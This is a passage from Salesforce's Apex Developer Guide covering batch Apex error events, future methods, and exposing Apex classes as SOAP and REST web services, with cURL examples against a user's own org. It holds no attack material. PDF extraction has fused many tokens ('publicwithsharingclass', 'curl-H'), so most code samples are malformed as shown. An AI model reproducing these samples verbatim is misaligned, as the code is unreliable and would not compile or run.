delay before the execution of next chained batch job. This delay optimizes the usage of available batch jobs and the flex queue by
preventing jobs that don't have any work from repeatedly starting.
Note: For API version 25.0 and earlier, you can’t call Database.executeBatch or System.scheduleBatch from
any batch Apex method.
The API version that’s used is the version of the running batch class that starts or schedules another batch job. If the finish
method in the running batch class calls a method in a helper class to start the next batch job, the API version of the helper class
doesn’t matter.
SEE ALSO:
Apex Reference Guide: Batchable Interface
Apex Reference Guide:FlexQueue Class
Apex Reference Guide: Test.enqueueBatchJobs()
Apex Reference Guide: Test.getFlexQueueOrder()
Salesforce Help: Client-driven and Server-driven Paging for Salesforce Connect—OData 2.0 and 4.0 Adapters
Salesforce Help: Define an External Data Source for Salesforce Connect—OData 2.0 or 4.0 Adapter
Firing Platform Events from Batch Apex
Batch Apex classes can fire platform events when encountering an error or exception. Clients listening on an event can obtain actionable
information, such as how often the event failed and which records were in scope at the time of failure. Events are also fired for Salesforce
Platform internal errors and other uncatchable Apex exceptions such as LimitExceptions, which are caused by reaching governor limits.
317
Invoking ApexApex Developer Guide

An event message provides more granular error tracking than the Apex Jobs UI. It includes the record IDs being processed, exception
type, exception message, and stack trace. You can also incorporate custom handling and retry logic for failures. You can invoke custom
Apex logic from any trigger on this type of event, so Apex developers can build functionality like custom logging or automated retry
handling.
For information on subscribing to platform events, see Subscribing to Platform Events.
The BatchApexErrorEvent object represents a platform event associated with a batch Apex class. This object is available in API version
44.0 and later. If the start, execute, or finish method of a batch Apex job encounters an unhandled exception, a
BatchApexErrorEvent platform event is fired. For more details, see BatchApexErrorEvent in the Platform Events Developer Guide.
To fire a platform event, a batch Apex class declaration must implement the Database.RaisesPlatformEvents interface.
publicwithsharingclassYourSampleBatchJobimplementsDatabase.Batchable<SObject>,
Database.RaisesPlatformEvents{
// classimplementation
}
Example:  This example creates a trigger to determine which accounts failed in the batch transaction. Custom field Dirty__c
indicates that the account was one of a failing batch and ExceptionType__c indicates the exception that was encountered.
JobScope and ExceptionType are fields in the BatchApexErrorEvent object.
triggerMarkDirtyIfFailon BatchApexErrorEvent(afterinsert) {
Set<Id>asyncApexJobIds= new Set<Id>();
for(BatchApexErrorEventevt:Trigger.new){
asyncApexJobIds.add(evt.AsyncApexJobId);
}
Map<Id,AsyncApexJob>jobs= new Map<Id,AsyncApexJob>(
[SELECTid, ApexClass.NameFROMAsyncApexJobWHEREId IN :asyncApexJobIds]
);
List<Account>records= new List<Account>();
for(BatchApexErrorEventevt:Trigger.new){
//onlyhandleeventsfor the job(s)we careabout
if(jobs.get(evt.AsyncApexJobId).ApexClass.Name== 'AccountUpdaterJob'){
for (Stringitem: evt.JobScope.split(',')) {
Accounta = new Account(
Id = (Id)item,
ExceptionType__c= evt.ExceptionType,
Dirty__c= true
);
records.add(a);
}
}
}
updaterecords;
}
Testing BatchApexErrorEvent Messages Published from Batch Apex Jobs
Use the Test.getEventBus().deliver() method to deliver event messages that are published by failed batch Apex jobs.
Use the Test.startTest() and Test.stopTest() statement block to execute the batch job.
318
Invoking ApexApex Developer Guide

This snippet shows how to execute a batch Apex job and deliver event messages. It executes the batch job after Test.stopTest().
This batch job publishes a BatchApexErrorEvent message when a failure occurs through the implementation of
Database.RaisesPlatformEvents. After Test.stopTest() runs, a separate Test.getEventBus().deliver()
statement is added so that it can deliver the BatchApexErrorEvent.
try {
Test.startTest();
Database.executeBatch(new SampleBatchApex());
Test.stopTest();
// BatchApexjob executeshere
} catch(Exceptione) {
// Catchany exceptionsthrownin the batchjob
}
// The batchjob firesBatchApexErrorEventif it fails,so deliverthe event.
Test.getEventBus().deliver();
Note:  If further platform events are published by downstream processes, add Test.getEventBus().deliver(); to
deliver the event messages for each process. For example, if a platform event trigger, which processes the event from the Apex
job, publishes another platform event, add a Test.getEventBus().deliver(); statement to deliver the event message.
SEE ALSO:
Platform Events Developer Guide: Deliver Test Event Messages
Platform Events Developer Guide: Event and Event Bus Properties in Test Context
Future Methods
A future method runs in the background, asynchronously. You can call a future method for executing long-running operations, such as
callouts to external Web services or any operation you’d like to run in its own thread, on its own time. You can also use future methods
to isolate DML operations on different sObject types to prevent the mixed DML error. Each future method is queued and executes when
system resources become available. That way, the execution of your code doesn’t have to wait for the completion of a long-running
operation. A benefit of using future methods is that some governor limits are higher, such as SOQL query limits and heap size limits.
To define a future method, simply annotate it with the future annotation, as follows.
globalclassFutureClass
{
@future
publicstaticvoidmyFutureMethod()
{
// Performsomeoperations
}
}
Methods with the future annotation must be static methods, and can only return a void type. The specified parameters must be
primitive data types, arrays of primitive data types, or collections of primitive data types. Methods with the future annotation can’t
take sObjects or objects as arguments.
The reason why sObjects can’t be passed as arguments to future methods is because the sObject can change between the time you call
the method and the time it executes. In this case, the future method gets the old sObject values and can overwrite them. To work with
319
Invoking ApexApex Developer Guide

sObjects that already exist in the database, pass the sObject ID instead (or collection of IDs) and use the ID to perform a query for the
most up-to-date record. The following example shows how to do so with a list of IDs.
globalclassFutureMethodRecordProcessing
{
@future
publicstaticvoidprocessRecords(List<ID> recordIds)
{
// Get thoserecordsbasedon the IDs
List<Account>accts= [SELECTNameFROMAccountWHEREId IN :recordIds];
// Processrecords
}
}
The following is a skeletal example of a future method that makes a callout to an external service. Notice that the annotation takes an
extra parameter (callout=true) to indicate that callouts are allowed. To learn more about callouts, see Invoking Callouts Using
Apex.
globalclassFutureMethodExample
{
@future(callout=true)
publicstaticvoidgetStockQuotes(StringacctName)
{
// Performa calloutto an externalservice
}
}
Inserting a user with a non-null role must be done in a separate thread from DML operations on other sObjects. In this example, the
future method, insertUserWithRole, which is defined in the Util class, performs the insertion of a user with the COO role.
This future method requires the COO role to be defined in the organization. The useFutureMethod method in MixedDMLFuture
inserts an account and calls the future method, insertUserWithRole.
This Util class contains the future method for inserting a user with a non-null role.
publicclassUtil{
@future
publicstaticvoidinsertUserWithRole(
Stringuname,Stringal, Stringem, Stringlname){
Profilep = [SELECTId FROMProfileWHEREName='StandardUser'];
UserRoler = [SELECTId FROMUserRoleWHEREName='COO'];
// Createnew userwitha non-nulluserroleID
Useru = new User(alias= al, email=em,
emailencodingkey='UTF-8', lastname=lname,
languagelocalekey='en_US',
localesidkey='en_US', profileid= p.Id,userroleid= r.Id,
timezonesidkey='America/Los_Angeles',
username=uname);
insertu;
}
}
320
Invoking ApexApex Developer Guide

This class contains the main method that calls the future method that was defined previously.
publicclassMixedDMLFuture{
publicstaticvoiduseFutureMethod(){
// FirstDML operation
Accounta = new Account(Name='Acme');
inserta;
// Thisnextoperation(inserta userwitha role)
// can'tbe mixedwiththe previousinsertunless
// it is withina futuremethod.
// Callfuturemethodto inserta userwitha role.
Util.insertUserWithRole(
'mruiz@awcomputing.com', 'mruiz',
'mruiz@awcomputing.com', 'Ruiz');
}
}
You can invoke future methods the same way you invoke any other method. However, a future method can’t invoke another future
method.
Methods with the future annotation have the following limits:
•
No more than 0 in batch and future contexts; 50 in queueable context method calls per Apex invocation. Asynchronous calls, such
as @future or executeBatch, called in a startTest, stopTest block, don’t count against your limits for the number
of queued jobs.
Note:  Having multiple future methods fan out from a queueable job isn’t recommended practice as it can rapidly add a large
number of future methods to the asynchronous queue. Request processing can be delayed and you can quickly hit the daily
maximum limit for asynchronous Apex method executions. See Future Method Performance Best Practices and Lightning
Platform Apex Limits.
•
The maximum number of future method invocations per a 24-hour period is 250,000 or the number of user licenses in your
organization multiplied by 200, whichever is greater. This limit is for your entire org and is shared with all asynchronous Apex: Batch
Apex, Queueable Apex, scheduled Apex, and future methods. To check how many asynchronous Apex executions are available,
make a request to REST API limits resource. See List Organization Limits in the REST API Developer Guide. If the number of
asynchronous Apex executions needed by a job exceeds the available number that’s calculated using the 24-hour rolling limit, an
exception is thrown. For example, if your async job requires 10,000 method executions and the available 24-hour rolling limit is
9,500, you get AsyncApexExecutions Limit exceeded exception. The license types that count toward this limit include full Salesforce
and Salesforce Platform user licenses, App Subscription user licenses, Chatter Only users, Identity users, and Company Communities
users.
Note:
•
Future jobs queued by a transaction aren’t processed if the transaction rolls back.
•
Future method jobs queued before a Salesforce service maintenance downtime remain in the queue. After service downtime
ends and when system resources become available, the queued future method jobs are executed. If a future method was
running when downtime occurred, the future method execution is rolled back and restarted after the service comes back up.
Testing Future Methods
To test methods defined with the future annotation, call the class containing the method in a startTest(), stopTest() code block. All
asynchronous calls made after the startTest method are collected by the system. When stopTest is executed, all asynchronous
processes are run synchronously.
321
Invoking ApexApex Developer Guide

For our example, here’s the test class.
@isTest
privateclassMixedDMLFutureTest{
@isTeststaticvoidtest1(){
UserthisUser= [SELECTId FROMUserWHEREId = :UserInfo.getUserId()];
// System.runAs()allowsmixedDML operationsin testcontext
System.runAs(thisUser){
// startTest/stopTestblockto run futuremethodsynchronously
Test.startTest();
MixedDMLFuture.useFutureMethod();
Test.stopTest();
}
// The futuremethodwillrun afterTest.stopTest();
// Verifyaccountis inserted
Account[]accts= [SELECTId fromAccountWHEREName='Acme'];
System.assertEquals(1,accts.size());
// Verifyuseris inserted
User[]users= [SELECTId fromUserwhereusername='mruiz@awcomputing.com'];
System.assertEquals(1,users.size());
}
}
Future Method Performance Best Practices
Salesforce uses a queue-based framework to handle asynchronous processes from such sources as future methods and batch Apex. This
queue is used to balance request workload across organizations. Use the following best practices to ensure your organization is efficiently
using the queue for your asynchronous processes.
•
Avoid adding large numbers of future methods to the asynchronous queue, if possible. If more than 2,000 unprocessed requests
from a single organization are in the queue, any additional requests from the same organization will be delayed while the queue
handles requests from other organizations.
•
Ensure that future methods execute as fast as possible. To ensure fast execution of batch jobs, minimize Web service callout times
and tune queries used in your future methods. The longer the future method executes, the more likely other queued requests are
delayed when there are a large number of requests in the queue.
•
Test your future methods at scale. To help determine if delays can occur, test using an environment that generates the maximum
number of future methods you’d expect to handle.
•
Consider using batch Apex instead of future methods to process large numbers of records.
Exposing Apex Methods as SOAP Web Services
You can expose your Apex methods as SOAP web services so that external applications can access your code and your application.
To expose your Apex methods, use Webservice Methods.
Tip:
•
Apex SOAP web services allow an external application to invoke Apex methods through SOAP Web services. Apex callouts
enable Apex to invoke external web or HTTP services.
•
Apex REST API exposes your Apex classes and methods as REST web services. See Exposing Apex Classes as REST Web Services.
322
Invoking ApexApex Developer Guide

Webservice Methods
Exposing Data with Webservice Methods
Considerations for Using the webservice Keyword
Overloading Web Service Methods
Webservice Methods
Apex class methods can be exposed as custom SOAP Web service calls. This allows an external application to invoke an Apex Web service
to perform an action in Salesforce. Use the webservice keyword to define these methods. For example:
globalclassMyWebService{
webservicestaticId makeContact(StringcontactLastName,Accounta) {
Contactc = new Contact(lastName= contactLastName,AccountId= a.Id);
insertc;
returnc.id;
}
}
A developer of an external application can integrate with an Apex class containing webservice methods by generating a WSDL for
the class. To generate a WSDL from an Apex class detail page:
1.In the application from Setup, enter “Apex Classes” in the QuickFind box, then select Apex Classes.
2.Click the name of a class that contains webservice methods.
3.Click Generate WSDL.
Exposing Data with Webservice Methods
Invoking a custom webservice method always uses system context. Consequently, the current user's credentials are not used, and
any user who has access to these methods can use their full power, regardless of permissions, field-level security, or sharing rules.
Developers who expose methods with the webservice keyword should therefore take care that they are not inadvertently exposing
any sensitive data.
Warning:  Apex class methods that are exposed through the API with the webservice keyword don't enforce object permissions
and field-level security by default. We recommend that you make use of the appropriate object or field describe result methods
to check the current user’s access level on the objects and fields that the webservice method is accessing. See DescribeSObjectResult
Class and DescribeFieldResult Class.
Also, sharing rules (record-level access) are enforced only when declaring a class with the withsharing keyword. This
requirement applies to all Apex classes, including to classes that contain webservice methods. To enforce sharing rules for webservice
methods, declare the class that contains these methods with the withsharing keyword. See Use the with sharing, without
sharing, and inherited sharing Keywords.
Considerations for Using the webservice Keyword
When using the webservice keyword, keep the following considerations in mind:
•
Use the webservice keyword to define top-level methods and outer class methods. You can’t use the webservice keyword
to define a class or an inner class method.
•
You cannot use the webservice keyword to define an interface, or to define an interface's methods and variables.
•
System-defined enums cannot be used in Web service methods.
323
Invoking ApexApex Developer Guide

•
You cannot use the webservice keyword in a trigger.
•
All classes that contain methods defined with the webservice keyword must be declared as global. If a method or inner
class is declared as global, the outer, top-level class must also be defined as global.
•
Methods defined with the webservice keyword are inherently global. Any Apex code that has access to the class can use these
methods. You can consider the webservice keyword as a type of access modifier that enables more access than global.
•
Define any method that uses the webservice keyword as static.
•
You cannot deprecate webservice methods or variables in managed package code.
•
Because there are no SOAP analogs for certain Apex elements, methods defined with the webservice keyword cannot take the
following elements as parameters. While these elements can be used within the method, they also cannot be marked as return
values.
–
Maps
–
Sets
–
Pattern objects
–
Matcher objects
–
Exception objects
•
Use the webservice keyword with any member variables that you want to expose as part of a Web service. Do not mark these
member variables as static.
Considerations for calling Apex SOAP Web service methods:
•
Salesforce denies access to Web service and executeanonymous requests from an AppExchange package that has
Restricted access.
•
Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime error if you assign a String value
that is too long for the field.
•
If a login call is made from the API for a user with an expired or temporary password, subsequent API calls to custom Apex SOAP
Web service methods aren't supported and result in the INVALID_OPERATION_WITH_EXPIRED_PASSWORD error. Reset the user's
password and make a call with an unexpired password to be able to call Apex Web service methods.
The following example shows a class with Web service member variables and a Web service method:
globalclassSpecialAccounts{
globalclassAccountInfo{
webserviceStringAcctName;
webserviceIntegerAcctNumber;
}
webservicestaticAccountcreateAccount(AccountInfoinfo){
Accountacct= new Account();
acct.Name= info.AcctName;
acct.AccountNumber= String.valueOf(info.AcctNumber);
insertacct;
returnacct;
}
webservicestaticId [] createAccounts(Accountparent,
Accountchild,AccountgrandChild){
insertparent;
child.parentId= parent.Id;
324
Invoking ApexApex Developer Guide

insertchild;
grandChild.parentId= child.Id;
insertgrandChild;
Id [] results= new Id[3];
results[0]= parent.Id;
results[1]= child.Id;
results[2]= grandChild.Id;
returnresults;
}
}
// Testclassfor the previousclass.
@isTest
privateclassSpecialAccountsTest{
testMethodstaticvoidtestAccountCreate(){
SpecialAccounts.AccountInfoinfo= new SpecialAccounts.AccountInfo();
info.AcctName= 'ManojCheenath';
info.AcctNumber= 12345;
Accountacct= SpecialAccounts.createAccount(info);
System.assert(acct!= null);
}
}
You can invoke this Web service using AJAX. For more information, see Apex in AJAX on page 342.
Overloading Web Service Methods
SOAP and WSDL do not provide good support for overloading methods. Consequently, Apex does not allow two methods marked with
the webservice keyword to have the same name. Web service methods that have the same name in the same class generate a
compile-time error.
Exposing Apex Classes as REST Web Services
You can expose your Apex classes and methods so that external applications can access your code and your application through the
REST architecture.
This is an overview of how to expose your Apex classes as REST web services. You'll learn about the class and method annotations and
see code samples that show you how to implement this functionality.
Tip:  Apex SOAP web services allow an external application to invoke Apex methods through SOAP web services. See Exposing
Apex Methods as SOAP Web Services.
Introduction to Apex REST
Apex REST Annotations
Apex REST Methods
Exposing Data with Apex REST Web Service Methods
Invoking a custom Apex REST Web service method always uses system context. Consequently, the current user's credentials are not
used, and any user who has access to these methods can use their full power, regardless of permissions, field-level security, or sharing
rules. Developers who expose methods using the Apex REST annotations should therefore take care that they are not inadvertently
exposing any sensitive data.
325
Invoking ApexApex Developer Guide

Apex REST Code Samples
Introduction to Apex REST
You can expose your Apex class and methods so that external applications can access your code and your application through the REST
architecture. This is done by defining your Apex class with the @RestResource annotation to expose it as a REST resource. Similarly,
add annotations to your methods to expose them through REST. For example, you can add the @HttpGet annotation to your method
to expose it as a REST resource that can be called by an HTTP GET request. For more information, see Apex REST Annotations on page
114
These are the classes containing methods and properties you can use with Apex REST.
DescriptionClass
Contains the RestRequest and RestResponse objects.RestContext Class
Use the System.RestRequest class to access and pass
request data in a RESTful Apex method.
request
Represents an object used to pass data from an Apex RESTful Web
service method to an HTTP response.
response
Governor Limits
Calls to Apex REST classes count against the organization's API governor limits. All standard Apex governor limits apply to Apex REST
classes. For example, the maximum request or response size is 6 MB for synchronous Apex or 12 MB for asynchronous Apex. For more
information, see Execution Governors and Limits.
Authentication
Apex REST supports these authentication mechanisms:
•
OAuth 2.0
•
Session ID
See Step Two: Set Up Authorization in the REST API Developer Guide.
Apex REST Annotations
Use these annotations to expose an Apex class as a RESTful Web service.
•
@ReadOnly
•
@RestResource(urlMapping='/yourUrl')
•
@HttpDelete
•
@HttpGet
•
@HttpPatch
•
@HttpPost
•
@HttpPut
326
Invoking ApexApex Developer Guide

Apex REST Methods
Apex REST supports two formats for representations of resources: JSON and XML. JSON representations are passed by default in the
body of a request or response, and the format is indicated by the Content-Type property in the HTTP header. You can retrieve the
body as a Blob from the HttpRequest object if there are no parameters to the Apex method. If parameters are defined in the Apex method,
an attempt is made to deserialize the request body into those parameters. If the Apex method has a non-void return type, the resource
representation is serialized into the response body.
These return and parameter types are allowed:
•
Apex primitives (excluding sObject and Blob).
•
sObjects
•
Lists or maps of Apex primitives or sObjects (only maps with String keys are supported).
•
User-defined types that contain member variables of the types listed above.
Note:  Apex REST doesn’t support XML serialization and deserialization of Connect in Apex objects. Apex REST does support JSON
serialization and deserialization of Connect in Apex objects. Also, some collection types, such as maps and lists, aren’t supported
with XML. See Request and Response Data Considerations for details.
Methods annotated with @HttpGet or @HttpDelete must have no parameters. This is because GET and DELETE requests have
no request body, so there's nothing to deserialize.
The @ReadOnly annotation supports the Apex REST annotations for all the HTTP requests: @HttpDelete, @HttpGet, @HttpPatch,
@HttpPost, and @HttpPut.
A single Apex class annotated with @RestResource can't have multiple methods annotated with the same HTTP request method.
For example, the same class can't have two methods annotated with @HttpGet.
Note:  Apex REST currently doesn't support requests of Content-Type multipart/form-data.
Apex REST Method Considerations
Here are a few points to consider when you define Apex REST methods.
•
RestRequest and RestResponse objects are available by default in your Apex methods through the static RestContext
object. This example shows how to access these objects through RestContext:
RestRequestreq = RestContext.request;
RestResponseres = RestContext.response;
•
If the Apex method has no parameters, Apex REST copies the HTTP request body into the RestRequest.requestBody
property. If the method has parameters, then Apex REST attempts to deserialize the data into those parameters and the data won't
be deserialized into the RestRequest.requestBody property.
•
Apex REST uses similar serialization logic for the response. An Apex method with a non-void return type has the return value serialized
into RestResponse.responseBody. If the return type includes fields with null values, those fields aren’t serialized into the
response body.
•
Apex REST methods can be used in managed and unmanaged packages. When calling Apex REST methods that are contained in a
managed package, you must include the managed package namespace in the REST call URL. For example, if the class is contained
in a managed package namespace called packageNamespace and the Apex REST methods use a URL mapping of
/MyMethod/*, the URL used via REST to call these methods would be of the form
https://instance.salesforce.com/services/apexrest/packageNamespace/MyMethod/. For more
information about managed packages, see What is a Package?.
327
Invoking ApexApex Developer Guide

•
If a login call is made from the API for a user with an expired or temporary password, subsequent API calls to custom Apex REST Web
service methods aren't supported and result in the MUTUAL_AUTHENTICATION_FAILED error. Reset the user's password and make
a call with an unexpired password to be able to call Apex Web service methods.
•
If the heap limit is exceeded in the process of serialization, an HTTP200 code is returned and the error {"status":"some
erroroccurred"} is appended to the partial JSON response. Returning a collection of sObjects from a REST method involves
buffering the JSON serialized form of each sObject. Heap and CPU limits may not be encountered until after the HTTP response
header and initial data has started streaming back to the client. To gain control of the statusCode and the responseBody, use
a RestResponse instead of directly returning sObjects.
User-Defined Types
You can use user-defined types for parameters in your Apex REST methods. Apex REST deserializes request data into public, private,
or global class member variables of the user-defined type, unless the variable is declared as static or transient. For example,
an Apex REST method that contains a user-defined type parameter might look like the following:
@RestResource(urlMapping='/user_defined_type_example/*')
globalwithsharingclassMyOwnTypeRestResource{
@HttpPost
globalstaticMyUserDefinedClassechoMyType(MyUserDefinedClassic) {
returnic;
}
globalclassMyUserDefinedClass{
globalStringstring1;
globalStringstring2{ get;set;}
privateStringprivateString;
globaltransientStringtransientString;
}
}
Valid JSON and XML request data for this method would look like:
{
"ic": {
"string1": "valuefor string1",
"string2": "valuefor string2",
"privateString": "valuefor privateString"
}
}
<request>
<ic>
<string1>valuefor string1</string1>
<string2>valuefor string2</string2>
<privateString>valuefor privateString</privateString>
</ic>
</request>
The public, private, or global class member variables must be types allowed by Apex REST:
•
Apex primitives (excluding sObject and Blob).
328
Invoking ApexApex Developer Guide

•
sObjects
•
Lists or maps of Apex primitives or sObjects (only maps with String keys are supported).
When creating user-defined types used as Apex REST method parameters, avoid introducing any class member variable definitions that
result in cycles (definitions that depend on each other) at run time in your user-defined types. Here's a simple example:
@RestResource(urlMapping='/CycleExample/*')
globalwithsharingclassApexRESTCycleExample{
@HttpGet
globalstaticMyUserDef1doCycleTest(){
MyUserDef1def1= new MyUserDef1();
MyUserDef2def2= new MyUserDef2();
def1.userDef2= def2;
def2.userDef1= def1;
returndef1;
}
globalclassMyUserDef1{
MyUserDef2userDef2;
}
globalclassMyUserDef2{
MyUserDef1userDef1;
}
}
The code in the previous example compiles, but at run time when a request is made, Apex REST detects a cycle between instances of
def1 and def2, and generates an HTTP 400 status code error response.
Request and Response Data Considerations
Some additional things to keep in mind for the request data for your Apex REST methods:
•
The names of the Apex parameters matter, although the order doesn’t. For example, valid requests in both XML and JSON look like
the following:
@HttpPost
globalstaticvoidmyPostMethod(Strings1, Integeri1, Booleanb1, Strings2)
{
"s1": "my firststring",
"i1": 123,
"s2": "my secondstring",
"b1": false
}
<request>
<s1>my firststring</s1>
<i1>123</i1>
<s2>my secondstring</s2>
<b1>false</b1>
</request>
329
Invoking ApexApex Developer Guide

•
The URL patterns URLpattern and URLpattern/* match the same URL. If one class has a urlMapping of URLpattern
and another class has a urlMapping of URLpattern/*, a REST request for this URL pattern resolves to the class that was saved
first.
•
Some parameter and return types can't be used with XML as the Content-Type for the request or as the accepted format for the
response, and hence, methods with these parameter or return types can't be used with XML. Lists, maps, or collections of collections,
for example, List<List<String>> aren't supported. However, you can use these types with JSON. If the parameter list
includes a type that's invalid for XML and XML is sent, an HTTP 415 status code is returned. If the return type is a type that's invalid
for XML and XML is the requested response format, an HTTP 406 status code is returned.
•
For request data in either JSON or XML, valid values for Boolean parameters are: true, false (both are treated as case-insensitive),
1 and 0 (the numeric values, not strings of “1” or “0”). Any other values for Boolean parameters result in an error.
•
If the JSON or XML request data contains multiple parameters of the same name, this results in an HTTP 400 status code error response.
For example, if your method specifies an input parameter named x, the following JSON request data results in an error:
{
"x" : "value1",
"x" : "value2"
}
Similarly, for user-defined types, if the request data includes data for the same user-defined type member variable multiple times,
this results in an error. For example, given this Apex REST method and user-defined type:
@RestResource(urlMapping='/DuplicateParamsExample/*')
globalwithsharingclassApexRESTDuplicateParamsExample{
@HttpPost
globalstaticMyUserDef1doDuplicateParamsTest(MyUserDef1def){
returndef;
}
globalclassMyUserDef1{
Integeri;
}
}
The following JSON request data also results in an error:
{
"def": {
"i" : 1,
"i" : 2
}
}
•
If you must specify a null value for one of your parameters in your request data, you can either omit the parameter entirely or specify
a null value. In JSON, you can specify null as the value. In XML, you must use the
http://www.w3.org/2001/XMLSchema-instance namespace with a nil value.
•
For XML request data, you must specify an XML namespace that references any Apex namespace your method uses. So, for example,
if you define an Apex REST method such as:
@RestResource(urlMapping='/namespaceExample/*')
globalclassMyNamespaceTest{
@HttpPost
330
Invoking ApexApex Developer Guide

globalstaticMyUDTechoTest(MyUDTdef,StringextraString){
returndef;
}
globalclassMyUDT{
Integercount;
}
}
You can use the following XML request data:
<request>
<defxmlns:MyUDT="http://soap.sforce.com/schemas/class/MyNamespaceTest">
<MyUDT:count>23</MyUDT:count>
</def>
<extraString>test</extraString>
</request>
Response Status Codes
The status code of a response is set automatically. This table lists some HTTP status codes and what they mean in the context of the
HTTP request method. For the full list of response status codes, see statusCode.
DescriptionResponse Status
Code
Request Method
The request was successful.200GET
The request was successful and the return type is non-void.200PATCH
The request was successful and the return type is void.204PATCH
An unhandled user exception occurred.400DELETE, GET, PATCH, POST, PUT
You don't have access to the specified Apex class.403DELETE, GET, PATCH, POST, PUT
The URL is unmapped in an existing @RestResource
annotation.
404DELETE, GET, PATCH, POST, PUT
The URL extension is unsupported.404DELETE, GET, PATCH, POST, PUT
The Apex class with the specified namespace couldn't be found.404DELETE, GET, PATCH, POST, PUT
The request method doesn't have a corresponding Apex method.405DELETE, GET, PATCH, POST, PUT
The Content-Type property in the header was set to a value other
than JSON or XML.
406DELETE, GET, PATCH, POST, PUT
The header specified in the HTTP request isn’t supported.406DELETE, GET, PATCH, POST, PUT
The XML return type specified for format is unsupported.406GET, PATCH, POST, PUT
The XML parameter type is unsupported.415DELETE, GET, PATCH, POST, PUT
The Content-Header Type specified in the HTTP request header
is unsupported.
415DELETE, GET, PATCH, POST, PUT
331
Invoking ApexApex Developer Guide

DescriptionResponse Status
Code
Request Method
An unhandled Apex exception occurred.500DELETE, GET, PATCH, POST, PUT
SEE ALSO:
JSON Support
XML Support
Exposing Data with Apex REST Web Service Methods
Invoking a custom Apex REST Web service method always uses system context. Consequently, the current user's credentials are not
used, and any user who has access to these methods can use their full power, regardless of permissions, field-level security, or sharing
rules. Developers who expose methods using the Apex REST annotations should therefore take care that they are not inadvertently
exposing any sensitive data.
Apex class methods that are exposed through the Apex REST API don’t enforce object permissions and field-level security by default. To
enforce object or field-level security while using SOQL SELECT statements in Apex, use the WITHUSER_MODE clause. You can strip
user-inaccessible fields from query and subquery results, or remove inaccessible sObject fields before DML operations by using the
Security.stripInaccessible method. You can also use the appropriate object or field describe result methods to check the
current user’s access level on the objects and fields that the Apex REST API method is accessing. See DescribeSObjectResult Class and
DescribeFieldResult Class.
Also, sharing rules (record-level access) are enforced only when declaring a class with the withsharing keyword. This requirement
applies to all Apex classes, including to classes that are exposed through Apex REST API. To enforce sharing rules for Apex REST API
methods, declare the class that contains these methods with the withsharing keyword. See Using the withsharing or
withoutsharing Keywords.
SEE ALSO:
Apex Security and Sharing
Apex REST Code Samples
These code samples show you how to expose Apex classes and methods through the REST architecture and how to call those resources
from a client.
Apex REST Basic Code Sample
This sample shows how to implement a simple REST API in Apex with three HTTP request methods to delete, retrieve, and update
a record.
Apex REST Code Sample Using RestRequest
This sample shows you how to add an attachment to a record by using the RestRequest object.
Apex REST Basic Code Sample
This sample shows how to implement a simple REST API in Apex with three HTTP request methods to delete, retrieve, and update a
record.
For more information about authenticating with cURL, see the Quick Start section of the REST API Developer Guide.
332
Invoking ApexApex Developer Guide

1.Create an Apex class in your instance from Setup. Enter ApexClasses in the QuickFind box, select Apex Classes, and
then click New. Add this code to the new Apex class:
@RestResource(urlMapping='/Account/*')
globalwithsharingclassMyRestResource{
@HttpDelete
globalstaticvoiddoDelete(){
RestRequestreq = RestContext.request;
RestResponseres = RestContext.response;
StringaccountId= req.requestURI.substring(req.requestURI.lastIndexOf('/')+1);
Accountaccount= [SELECTId FROMAccountWHEREId = :accountId];
deleteaccount;
}
@HttpGet
globalstaticAccountdoGet(){
RestRequestreq = RestContext.request;
RestResponseres = RestContext.response;
StringaccountId= req.requestURI.substring(req.requestURI.lastIndexOf('/')+1);
Accountresult= [SELECTId, Name,Phone,WebsiteFROMAccountWHEREId =
:accountId];
returnresult;
}
@HttpPost
globalstaticStringdoPost(Stringname,
Stringphone,Stringwebsite){
Accountaccount= new Account();
account.Name= name;
account.phone= phone;
account.website= website;
insertaccount;
returnaccount.Id;
}
}
2.To call the doGet method from a client, open a command-line window and execute the following cURL command to retrieve
an account by ID:
curl-H "Authorization:BearersessionId"
"https://instance.salesforce.com/services/apexrest/Account/accountId"
•
Replace sessionId with the <sessionId> element that you noted in the login response.
•
Replace instance with your <serverUrl> element.
•
Replace accountId with the ID of an account which exists in your organization.
After calling the doGet method, Salesforce returns a JSON response with data such as the following:
{
"attributes":
{
"type": "Account",
333
Invoking ApexApex Developer Guide

"url": "/services/data/v22.0/sobjects/Account/accountId"
},
"Id": "accountId",
"Name": "Acme"
}
Note:  The cURL examples in this section don't use a namespaced Apex class so you don’t see the namespace in the URL.
3.Create a file called account.txt to contain the data for the account you will create in the next step.
{
"name": "WingoDucks",
"phone": "707-555-1234",
"website": "www.wingo.ca.us"
}
4.Using a command-line window, execute the following cURL command to create a new account:
curl-H "Authorization:BearersessionId" -H "Content-Type:application/json"-d
@account.txt"https://instance.salesforce.com/services/apexrest/Account/"
After calling the doPost method, Salesforce returns a response with data such as the following:
"accountId"
The accountId is the ID of the account you just created with the POST request.
5.Using a command-line window, execute the following cURL command to delete an account by specifying the ID:
curl—X DELETE—H "Authorization:BearersessionId"
"https://instance.salesforce.com/services/apexrest/Account/accountId"
Apex REST Code Sample Using RestRequest
This sample shows you how to add an attachment to a record by using the RestRequest object.
For more information about authenticating with cURL, see the Quick Start section of the REST API Developer Guide. In this code, the
binary file data is stored in the RestRequest object, and the Apex service class accesses the binary data in the RestRequest object .
1.Create an Apex class in your org from Setup by entering ApexClasses in the QuickFind box, then selecting Apex Classes.
Click New and add the following code to your new class:
@RestResource(urlMapping='/CaseManagement/v1/*')
globalwithsharingclassCaseMgmtService
{
@HttpPost
globalstaticStringattachPic(){
RestRequestreq = RestContext.request;
RestResponseres = Restcontext.response;
Id caseId= req.requestURI.substring(req.requestURI.lastIndexOf('/')+1);
Blobpicture= req.requestBody;
Attachmenta = new Attachment(ParentId= caseId,
Body= picture,
334
Invoking ApexApex Developer Guide

ContentType= 'image/jpg',
Name= 'VehiclePicture');
inserta;
returna.Id;
}
}
2.Open a command-line window and execute the following cURL command to upload the attachment to a case:
curl-H "Authorization:BearersessionId" -H "X-PrettyPrint:1" -H "Content-Type:
image/jpeg"--data-binary@file
"https://MyDomainName.my.salesforce.com/services/apexrest/CaseManagement/v1/caseId"
•
Replace sessionId with the <sessionId> element that you noted in the login response.
•
Replace MyDomainName with the My Domain name for your org.
•
Replace caseId with the ID of the case you want to add the attachment to.
•
Replace file with the path and file name of the file you want to attach.
Your command should look something like this (with the sessionId replaced with your session ID and MyDomainName
replaced with the My Domain Name for your org):
curl-H "Authorization:BearersessionId"
-H "X-PrettyPrint:1" -H "Content-Type:image/jpeg"--data-binary
